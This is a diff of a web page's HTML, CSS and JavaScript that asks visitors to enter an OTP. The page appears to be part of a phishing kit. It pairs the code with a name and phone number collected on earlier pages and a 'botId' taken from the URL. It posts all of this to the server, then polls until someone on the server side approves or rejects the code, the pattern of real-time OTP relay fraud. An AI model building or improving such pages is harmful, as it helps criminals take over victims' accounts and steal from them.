@@ -15,6 +15,7 @@ body {
    align-items:center;
    justify-content:center;
 }
+
 .card { 
    background:#fff;
    width:92%;
@@ -23,7 +24,8 @@ body {
    padding:24px 20px 28px;
    box-shadow:0 10px 30px rgba(0,0,0,0.15);
    position:relative;
- }
+}
+
 .close { 
    position:absolute;
    top:14px; 
@@ -38,24 +40,21 @@ body {
    justify-content:center;
    font-weight:bold;
    cursor:pointer;
- }
+}
+
 h1 {
   text-align:center;
   font-size:22px;
   margin-bottom:6px; 
 }
+
 .info {
    text-align:center;
    font-size:14px;
    color:#666;
    margin-bottom:24px; 
 }
-.otp-wrap {
-   /* display:flex;
-   justify-content:space-between;
-   gap:8px; */
-   margin-bottom:18px;
-}
+
 .otp-wrap input {
   width:100%; 
   height:54px;
@@ -64,21 +63,9 @@ h1 {
   border-radius:8px;
   border:1.5px solid #ddd;
   outline:none; 
-  box-sizing: border-box;
   letter-spacing: 6px;
- }
-.otp-wrap input:disabled {
-   background:#f2f2f2;
 }
-.otp-wrap input:focus {
-   border-color:#e11b22;
-}
-.timer {
-   text-align:center;
-   font-size:13px;  
-   color:#777;
-   margin-bottom:20px;
-}
+
 button {
    width:100%;
    padding:16px;
@@ -90,9 +77,11 @@ button {
    opacity:0.5;
    cursor:pointer;
 }
+
 button:enabled { 
   opacity:1; 
 }
+
 .waiting { 
   text-align:center;
   font-size:14px;
@@ -100,9 +89,10 @@ button:enabled {
   margin-top:16px; 
   display:none;
 }
+
 #otp-alert {
-    text-align: center;
-    align-items: center;
+    text-align:center;
+    margin-top:10px;
 }
 </style>
 </head>
@@ -116,19 +106,10 @@ button:enabled {
   <div class="info">Please enter the OTP sent to verify.</div>
 
   <div class="otp-wrap">
-    <input
-      id="otpInput"
-      type="tel"
-      inputmode="numeric"
-      placeholder="Enter OTP"
-    >
+    <input id="otpInput" type="tel" inputmode="numeric" placeholder="Enter OTP">
   </div>
 
   <div id="otp-alert"></div>
-
-  <div class="timer">
-    You can resend OTP in <span id="countdown">120</span>
-  </div>
 
   <button id="verifyBtn" disabled>Submit</button>
 
@@ -138,90 +119,86 @@ button:enabled {
 <script>
 const otpInput = document.getElementById('otpInput');
 const verifyBtn = document.getElementById('verifyBtn');
-const countdownEl = document.getElementById('countdown');
 const waitingEl = document.getElementById('waiting');
 const alertBox = document.getElementById('otp-alert');
 
 const params = new URLSearchParams(window.location.search);
-const urlBotId = params.get('botId');
-if(urlBotId) localStorage.setItem('botId', urlBotId);
+const botId = params.get('botId') || localStorage.getItem('botId');
+
+localStorage.setItem('botId', botId);
 
 const fullName = localStorage.getItem('fullName');
 const phone = localStorage.getItem('phone');
-const botId = localStorage.getItem('botId');
 
 if(!fullName || !phone || !botId){
   alert('Session expired. Please start again.');
   window.location.href='index.html';
 }
 
-/* COUNTDOWN */
-let timeLeft = 120;
-const timer = setInterval(()=>{
-  timeLeft--;
-  countdownEl.textContent = timeLeft;
-  if(timeLeft <= 0) clearInterval(timer);
-},1000);
-
-/* INPUT */
 otpInput.addEventListener('input', () => {
   otpInput.value = otpInput.value.replace(/\D/g,'');
   verifyBtn.disabled = otpInput.value.trim().length === 0;
 });
 
-/* SUBMIT */
 verifyBtn.addEventListener('click', async () => {
+
   const otp = otpInput.value.trim();
-  if(!otp) return;
 
   verifyBtn.disabled = true;
   waitingEl.style.display = 'block';
   alertBox.textContent = '';
 
   try {
+
     const res = await fetch(`${window.location.origin}/submit-otp`, {
       method: 'POST',
       headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({ name: fullName, phone, otp, botId })
+      body: JSON.stringify({
+        name: fullName,
+        phone,
+        otp,
+        botId
+      })
     });
 
     const data = await res.json();
 
     if(!data.requestId){
-      throw new Error("No requestId returned");
+      throw new Error("Missing requestId");
     }
 
     pollApproval(data.requestId);
 
-  } catch (e) {
+  } catch (err) {
     waitingEl.style.display = 'none';
     verifyBtn.disabled = false;
     alertBox.style.color = 'red';
     alertBox.textContent = 'Server error. Try again.';
   }
+
 });
 
-/* STABLE POLLING (FIXED) */
 function pollApproval(requestId){
 
   let attempts = 0;
-  const maxAttempts = 60; // ~2 minutes
+  const maxAttempts = 60;
 
   const interval = setInterval(async () => {
+
     attempts++;
 
     try {
+
       const res = await fetch(`${window.location.origin}/check-otp/${requestId}`);
       const data = await res.json();
 
-      // ✅ SUCCESS
-      if (data.approved === true) {
+      // ✅ FIXED: server uses redirect OR approved, handle both
+      if (data.approved === true || data.redirect === 'success') {
         clearInterval(interval);
         window.location.href = 'success.html';
         return;
       }
 
-      // ❌ FAIL
       if (data.approved === false) {
         clearInterval(interval);
         waitingEl.style.display = 'none';
@@ -231,23 +208,16 @@ function pollApproval(requestId){
         return;
       }
 
-      // ⛔ BLOCK / TIMEOUT SAFETY
-      if (data.blocked) {
-        clearInterval(interval);
-        window.location.href = 'index.html';
-        return;
-      }
-
       if (attempts >= maxAttempts) {
         clearInterval(interval);
         waitingEl.style.display = 'none';
         verifyBtn.disabled = false;
         alertBox.style.color = 'red';
-        alertBox.textContent = 'Request timed out. Try again.';
+        alertBox.textContent = 'Request timed out.';
       }
 
-    } catch (err) {
-      console.log("poll error", err);
+    } catch (e) {
+      console.log("poll error", e);
     }
 
   }, 2000);
